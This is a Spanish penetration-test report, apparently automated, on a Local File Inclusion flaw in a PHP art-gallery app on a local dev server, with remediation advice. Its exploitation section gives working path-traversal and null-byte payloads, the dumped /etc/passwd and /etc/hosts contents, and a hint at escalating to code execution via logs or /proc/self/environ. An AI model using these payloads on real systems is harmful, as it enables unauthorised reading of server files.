# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:56:24  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Resultado:** VULNERABILIDAD ENCONTRADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se identificó una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor mediante manipulación del parámetro `page` en `gallery.php`.

---

## 2. Descripción del Objetivo

La aplicación web es una galería de arte virtual con las siguientes secciones:
- Arte Moderno (`gallery.php?page=modern`)
- Arte Clásico (`gallery.php?page=classic`)
- Arte Abstracto (`gallery.php?page=abstract`)
- Acerca de (`gallery.php?page=about`)

---

## 3. Vulnerabilidad Identificada

### 3.1 Local File Inclusion (LFI)

| Campo | Detalle |
|-------|---------|
| **Tipo** | Local File Inclusion (LFI) |
| **Severidad** | Crítica |
| **CVSS Score** | 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **Parámetro vulnerable** | `page` en `gallery.php` |
| **URL afectada** | `http://web.dev.local:8081/gallery.php` |

### 3.2 Descripción Técnica

La aplicación incluye archivos PHP en función del valor del parámetro `page`. El código PHP construye la ruta del archivo a incluir concatenando el valor del parámetro con el directorio `pages/` y la extensión `.php`. Sin embargo, no implementa validación ni saneamiento adecuado del parámetro, permitiendo el uso de secuencias de traversal de directorio (`../`).

**Comportamiento observado:**
- La aplicación busca archivos en la ruta: `pages/<valor_page>.php`
- Usando `../../../../../../etc/passwd` se puede escapar del directorio raíz de la aplicación
- El null byte (`%00`) también bypasea la extensión `.php` añadida automáticamente

---

## 4. Explotación

### 4.1 Vector de ataque - Path Traversal

**Payload utilizado:**
```
GET /gallery.php?page=../../../../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Vector de ataque - Null Byte Bypass

**Payload utilizado:**
```
GET /gallery.php?page=../../../etc/passwd%00 HTTP/1.1
Host: web.dev.local:8081
```
- Resultado: Lectura exitosa de `/etc/passwd` (el null byte elimina la extensión `.php` añadida)

### 4.3 Otros archivos accedidos

**`/etc/hosts`:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
fe00::       ip6-localnet
ff00::       ip6-mcastprefix
ff02::1      ip6-allnodes
ff02::2      ip6-allrouters
172.19.0.2   d5054e367753
```

---

## 5. Impacto

- **Confidencialidad:** Alta - Lectura de archivos sensibles del sistema (contraseñas, configuraciones, código fuente)
- **Integridad:** No afectada directamente (solo lectura)
- **Disponibilidad:** No afectada directamente
- **Posible escalada:** Con acceso a logs del servidor o `/proc/self/environ`, podría escalar a Remote Code Execution (RCE)

---

## 6. Recomendaciones

1. **Validar entrada del usuario:** Implementar una lista blanca (`whitelist`) de valores permitidos para el parámetro `page`.
2. **Evitar inclusión dinámica de archivos:** Si es posible, mapear los valores del parámetro a archivos específicos en lugar de usar el valor directamente.
3. **Deshabilitar funciones peligrosas:** Revisar y restringir el uso de `include()`, `require()`, `include_once()` y `require_once()` con valores controlados por el usuario.
4. **Implementar `open_basedir`:** Restringir los directorios accesibles por PHP mediante la directiva `open_basedir` en `php.ini`.
5. **Sanitización:** Eliminar secuencias `../` y `./` del input del usuario antes de usarlo en rutas de archivo.
6. **WAF:** Implementar un Web Application Firewall que detecte y bloquee patrones de traversal de directorio.

---

## 7. Conclusión

La aplicación web presenta una vulnerabilidad crítica de LFI que permite la lectura arbitraria de archivos del sistema. La explotación fue exitosa con múltiples técnicas (path traversal y null byte bypass), confirmando la falta de controles de seguridad en la validación del parámetro `page`. Se recomienda aplicar las correcciones indicadas de manera urgente.

---

*Informe generado por análisis automatizado de seguridad - 2026-04-30*
